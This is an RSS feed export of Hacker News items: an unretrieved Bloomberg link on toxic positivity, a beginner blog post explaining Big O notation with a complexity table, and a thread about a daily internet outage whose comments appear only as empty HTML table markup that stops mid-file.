<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Toxic positivity does more harm than good</title>
<link>https://www.bloomberg.com/news/articles/2021-01-14/what-is-fono-toxic-positivity-is-doing-more-harm-than-good</link>
<guid isPermaLink="true" >https://www.bloomberg.com/news/articles/2021-01-14/what-is-fono-toxic-positivity-is-doing-more-harm-than-good</guid>
<description>[unable to retrieve full-text content]
&lt;p&gt;Article URL: &lt;a href=&quot;https://www.bloomberg.com/news/articles/2021-01-14/what-is-fono-toxic-positivity-is-doing-more-harm-than-good&quot;&gt;https://www.bloomberg.com/news/articles/2021-01-14/what-is-fono-toxic-positivity-is-doing-more-harm-than-good&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=25803568&quot;&gt;https://news.ycombinator.com/item?id=25803568&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Points: 338&lt;/p&gt;
&lt;p&gt;# Comments: 224&lt;/p&gt;
</description>
<pubDate>Sat, 16 Jan 2021 17:12:54 +0000</pubDate>
<dc:creator>prostoalex</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.bloomberg.com/tosv2.html?vid=&amp;uuid=85251730-585f-11eb-99c9-4b68d536978a&amp;url=L25ld3MvYXJ0aWNsZXMvMjAyMS0wMS0xNC93aGF0LWlzLWZvbm8tdG94aWMtcG9zaXRpdml0eS1pcy1kb2luZy1tb3JlLWhhcm0tdGhhbi1nb29k</dc:identifier>
</item>
<item>
<title>Big O Notation – Explained as Easily as Possible</title>
<link>https://thatcomputerscientist.com/big-o-notation-explained-as-easily-as-possible</link>
<guid isPermaLink="true" >https://thatcomputerscientist.com/big-o-notation-explained-as-easily-as-possible</guid>
<description>&lt;p&gt;Data Structures and Algorithms is about solving problems efficiently. A bad programmer solves their problems inefficiently and a really bad programmer doesn't even know why their solution is inefficient. So, the question is, &lt;em&gt;How do you rank an algorithm's efficiency?&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The simple answer to that question is the &lt;strong&gt;Big O Notation&lt;/strong&gt;. How does that work? Let me explain!&lt;/p&gt;
&lt;p&gt;Say you wrote a function which goes through every number in a list and adds it to a &lt;em&gt;total_sum&lt;/em&gt; variable.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.hashnode.com/res/hashnode/image/upload/v1610785957976/1d53AER34.png?auto=compress&quot; alt=&quot;Screenshot 2021-01-16 at 2.02.19 PM.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;If you consider &quot;addition&quot; to be 1 operation then running this function on a list of 10 numbers will cost 10 operations, running it on a list of 20 numbers costs 20 operations and similarly running it on a list of n numbers costs the &lt;em&gt;length of list&lt;/em&gt; (n) operations.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.hashnode.com/res/hashnode/image/upload/v1610786373466/WWOOmyjH9.gif?auto=format,compress&amp;amp;gif-q=60&quot; alt=&quot;Screen Recording 2021-01-16 at 2.01.09 PM.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Now let's assume you wrote another function that would return the first number in a list.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.hashnode.com/res/hashnode/image/upload/v1610786595803/WcObNzV40.png?auto=compress&quot; alt=&quot;Screenshot 2021-01-16 at 2.09.39 PM.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Now, no matter how large this list is, this function will never cost more than one operation. Fairly, these two algorithms have different &lt;strong&gt;time complexity&lt;/strong&gt; or &lt;em&gt;relationship between growth of input size and growth of operations executed&lt;/em&gt;. We communicate these time complexities using &lt;strong&gt;&lt;em&gt;Big O Notation&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;Big O Notation is a mathematical notation used to classify algorithms according to how their run time or space requirements grow as the input size grows.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Referring to the complexities as &lt;em&gt;'&lt;strong&gt;n&lt;/strong&gt;'&lt;/em&gt;, common complexities (ranked from good to bad) are:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Constant - &lt;strong&gt;O(1)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Logarithmic &lt;strong&gt;O(log n)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Linear - &lt;strong&gt;O(n)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;n log n - &lt;strong&gt;O(n log n)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Quadratic - &lt;strong&gt;O(n²)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Exponential - &lt;strong&gt;O(2ⁿ)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Factorial - &lt;strong&gt;O(n!)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.hashnode.com/res/hashnode/image/upload/v1610787546688/SufUcCJVY.png?auto=compress&quot; alt=&quot;Screenshot 2021-01-16 at 2.23.08 PM.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Our first algorithm runs in &lt;em&gt;O(n)&lt;/em&gt;, meaning its operations grew in a linear relationship with the input size - in this case, the amount of numbers in the list. Our second algorithm is not dependent on the input size at all - so it runs in constant time. Let's take a look at how many operations a program has to execute in function with an input size of &lt;em&gt;n = 5 vs n = 50&lt;/em&gt;.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;td/&gt;
&lt;td&gt;n = 5&lt;/td&gt;
&lt;td&gt;n = 50&lt;/td&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;O(1)&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;O(log n)&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;O(n)&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;50&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;O(n log n)&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;td&gt;300&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;O(n²)&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;25&lt;/td&gt;
&lt;td&gt;2500&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;O(2ⁿ)&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;32&lt;/td&gt;
&lt;td&gt;1125899906842624&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;O(n!)&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;120&lt;/td&gt;
&lt;td&gt;3.0414093e+64&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;It might not matter when the input is small, but this gap gets very dramatic as the input size increases.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.hashnode.com/res/hashnode/image/upload/v1610788579877/ejJP5RkiF.gif?auto=format,compress&amp;amp;gif-q=60&quot; alt=&quot;Screen Recording 2021-01-16 at 2.33.46 PM.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;If n were 10000, a function that runs in &lt;em&gt;log(n)&lt;/em&gt; would only take 14 operations and a function that runs in &lt;em&gt;n!&lt;/em&gt; would set your computer on fire!&lt;/p&gt;
&lt;p&gt;For Big O Notation, we &lt;em&gt;drop constants&lt;/em&gt; so &lt;em&gt;O(10.n)&lt;/em&gt; and &lt;em&gt;O(n/10)&lt;/em&gt; are both equivalent to &lt;em&gt;O(n)&lt;/em&gt; because the graph is still linear.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.hashnode.com/res/hashnode/image/upload/v1610788828910/JYXeRjI-G.png?auto=compress&quot; alt=&quot;Screenshot 2021-01-16 at 2.47.52 PM.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Big O Notation is also used for &lt;strong&gt;space complexity&lt;/strong&gt;, which works the same way - &lt;em&gt;how much space an algorithm uses as n grows&lt;/em&gt; or &lt;em&gt;relationship between growth of input size and growth of space needed&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;So, yeah! This has been the simplest possible explanation of the Big O Notation from my side and I hope you enjoyed reading this. You can subscribe to my newsletter and never miss my upcoming articles, if you want to. Also, if you found this information helpful, share it with your friends on different social media platforms. If you have any suggestions or feedback, feel free to let me know that in the comments.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Happy Programming!&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 16 Jan 2021 16:33:42 +0000</pubDate>
<dc:creator>optimalsolver</dc:creator>
<og:title>Big O Notation - explained as easily as possible</og:title>
<og:type>article</og:type>
<og:url>https://thatcomputerscientist.com/big-o-notation-explained-as-easily-as-possible</og:url>
<og:image>https://hashnode.com/utility/r?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1610789606012%2FMGgIIOjkr.jpeg%3Fw%3D1200%26h%3D630%26fit%3Dcrop%26crop%3Dentropy%26auto%3Dcompress</og:image>
<og:description>Data Structures and Algorithms is about solving problems efficiently. A bad programmer solves their problems inefficiently and a really bad programmer doesn't even know why their solution is inefficient. So, the question is, How do you rank an algori...</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://thatcomputerscientist.com/big-o-notation-explained-as-easily-as-possible?guid=none&amp;deviceId=e3d23393-bee8-46e5-b0dd-674729d2e7eb</dc:identifier>
</item>
<item>
<title>Every day at the same time, my internet dies for 1 minute. How do I investigate?</title>
<link>https://news.ycombinator.com/item?id=25802714</link>
<guid isPermaLink="true" >https://news.ycombinator.com/item?id=25802714</guid>
<description>&lt;tr class=&quot;athing comtr&quot; id=&quot;25804738&quot; readability=&quot;10.788267644363&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;5.3941338221815&quot;&gt;&lt;tr readability=&quot;10.788267644363&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;8.826764436297&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803674&quot; readability=&quot;9.400479616307&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.7002398081535&quot;&gt;&lt;tr readability=&quot;9.400479616307&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.1103117505995&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804167&quot; readability=&quot;6.5625&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.28125&quot;&gt;&lt;tr readability=&quot;6.5625&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804982&quot; readability=&quot;4.2767295597484&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.1383647798742&quot;&gt;&lt;tr readability=&quot;4.2767295597484&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804204&quot; readability=&quot;3.1496062992126&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805192&quot; readability=&quot;8.6478260869565&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.3239130434783&quot;&gt;&lt;tr readability=&quot;8.6478260869565&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;10.089130434783&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804450&quot; readability=&quot;3.6485355648536&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.8242677824268&quot;&gt;&lt;tr readability=&quot;3.6485355648536&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802900&quot; readability=&quot;5.6675900277008&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.8337950138504&quot;&gt;&lt;tr readability=&quot;5.6675900277008&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.7783933518006&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804111&quot; readability=&quot;8.7992565055762&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.3996282527881&quot;&gt;&lt;tr readability=&quot;8.7992565055762&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.3550185873606&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804197&quot; readability=&quot;2.404958677686&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.202479338843&quot;&gt;&lt;tr readability=&quot;2.404958677686&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803193&quot; readability=&quot;8.8576158940397&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.4288079470199&quot;&gt;&lt;tr readability=&quot;8.8576158940397&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;13.729304635762&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803649&quot; readability=&quot;7.6088888888889&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.8044444444444&quot;&gt;&lt;tr readability=&quot;7.6088888888889&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;8.56&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803852&quot; readability=&quot;6.497005988024&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.248502994012&quot;&gt;&lt;tr readability=&quot;6.497005988024&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25806344&quot; readability=&quot;2.4255319148936&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2127659574468&quot;&gt;&lt;tr readability=&quot;2.4255319148936&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803779&quot; readability=&quot;2.3445378151261&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804565&quot; readability=&quot;6.3474576271186&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.1737288135593&quot;&gt;&lt;tr readability=&quot;6.3474576271186&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805710&quot; readability=&quot;0.86075949367089&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25806018&quot; readability=&quot;12.241086587436&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;6.1205432937182&quot;&gt;&lt;tr readability=&quot;12.241086587436&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;240&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;8.7436332767402&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803029&quot; readability=&quot;4.6875&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.34375&quot;&gt;&lt;tr readability=&quot;4.6875&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803081&quot; readability=&quot;2.3260869565217&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805549&quot; readability=&quot;2.5112359550562&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2556179775281&quot;&gt;&lt;tr readability=&quot;2.5112359550562&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.3483146067416&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803600&quot; readability=&quot;3.6081632653061&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.8040816326531&quot;&gt;&lt;tr readability=&quot;3.6081632653061&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804123&quot; readability=&quot;4.6969696969697&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.3484848484848&quot;&gt;&lt;tr readability=&quot;4.6969696969697&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.6363636363636&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804292&quot; readability=&quot;1.3333333333333&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804411&quot; readability=&quot;4.5121951219512&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.2560975609756&quot;&gt;&lt;tr readability=&quot;4.5121951219512&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.609756097561&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804495&quot; readability=&quot;3.2798165137615&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805646&quot; readability=&quot;5.7590361445783&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.8795180722892&quot;&gt;&lt;tr readability=&quot;5.7590361445783&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;200&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.2791164658635&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803445&quot; readability=&quot;5.4051724137931&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.7025862068966&quot;&gt;&lt;tr readability=&quot;5.4051724137931&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;4.0538793103448&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802876&quot; readability=&quot;5.52&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.76&quot;&gt;&lt;tr readability=&quot;5.52&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
